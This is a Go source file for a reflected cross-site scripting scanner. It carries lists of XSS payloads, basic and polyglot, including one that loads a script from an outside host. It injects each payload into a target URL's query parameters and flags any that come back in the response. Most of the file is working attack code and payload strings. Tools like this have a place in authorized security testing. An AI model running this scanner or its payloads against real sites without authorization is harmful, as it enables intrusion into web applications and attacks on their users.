package xss

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/fatih/color"
)

type XSSResult struct {
	URL       string
	Payload   string
	Reflected bool
	Param     string
}

var basicPayloads = []string{
	`<script>alert(1)</script>`,
	`"><script>alert(1)</script>`,
	`'><script>alert(1)</script>`,
	`<img src=x onerror=alert(1)>`,
	`<svg onload=alert(1)>`,
	`javascript:alert(1)`,
	`<body onload=alert(1)>`,
	`<input autofocus onfocus=alert(1)>`,
	`<details open ontoggle=alert(1)>`,
	`<iframe src="javascript:alert(1)">`,
}

var polyglotPayloads = []string{
	`jaVasCript:/*-/*` + "`" + `/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`,
	`">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>`,
	`%3Cscript%3Ealert%281%29%3C%2Fscript%3E`,
	`<script/src=//xss.rocks/xss.js></script>`,
	`<IMG SRC="jav&#x09;ascript:alert('XSS');">`,
	`<IMG SRC="jav&#x0A;ascript:alert('XSS');">`,
	`<IMG SRC="jav&#x0D;ascript:alert('XSS');">`,
	`\";alert('XSS');//`,
	`';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//`,
	`<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`,
}

type Prober struct {
	target   string
	polyglot bool
	client   *http.Client
	results  []XSSResult
}

func New(target string, polyglot bool) *Prober {
	return &Prober{
		target:   target,
		polyglot: polyglot,
		client: &http.Client{
			Timeout: 10 * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
	}
}

func (p *Prober) probe(baseURL, param, payload string) {
	u, err := url.Parse(baseURL)
	if err != nil {
		return
	}

	q := u.Query()
	q.Set(param, payload)
	u.RawQuery = q.Encode()
	target := u.String()

	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Lyussfyuring002/XSS-Probe)")

	resp, err := p.client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}

	bodyStr := string(body)
	reflected := strings.Contains(bodyStr, payload) ||
		strings.Contains(bodyStr, url.QueryEscape(payload))

	if reflected {
		r := XSSResult{
			URL:       target,
			Payload:   payload,
			Reflected: true,
			Param:     param,
		}
		p.results = append(p.results, r)
		color.Red("[XSS REFLECTED] param=%q payload=%q\n", param, truncate(payload, 60))
	}
}

func (p *Prober) extractParams() []string {
	u, err := url.Parse(p.target)
	if err != nil {
		return []string{"q", "search", "id", "page", "query", "s", "input", "name", "keyword"}
	}
	params := make([]string, 0)
	for k := range u.Query() {
		params = append(params, k)
	}
	if len(params) == 0 {
		params = []string{"q", "search", "id", "page", "query", "s", "input", "name", "keyword"}
	}
	return params
}

func (p *Prober) Run() ([]XSSResult, error) {
	fmt.Println(strings.Repeat("=", 64))
	color.Cyan("[*] XSS probe: %s\n", p.target)

	payloads := basicPayloads
	if p.polyglot {
		payloads = append(payloads, polyglotPayloads...)
		color.Yellow("[*] polyglot mode enabled (%d payloads)\n", len(payloads))
	} else {
		color.Cyan("[*] basic mode (%d payloads)\n", len(payloads))
	}

	params := p.extractParams()
	color.Cyan("[*] params: %s\n", strings.Join(params, ", "))
	fmt.Println(strings.Repeat("-", 64))

	for _, param := range params {
		for _, payload := range payloads {
			p.probe(p.target, param, payload)
		}
	}

	fmt.Println(strings.Repeat("=", 64))
	if len(p.results) == 0 {
		color.Yellow("[~] no reflected XSS detected\n")
	} else {
		color.Red("[!] %d reflected XSS findings\n", len(p.results))
	}
	return p.results, nil
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

func Probe(target string, polyglot bool) error {
	pr := New(target, polyglot)
	_, err := pr.Run()
	return err
}
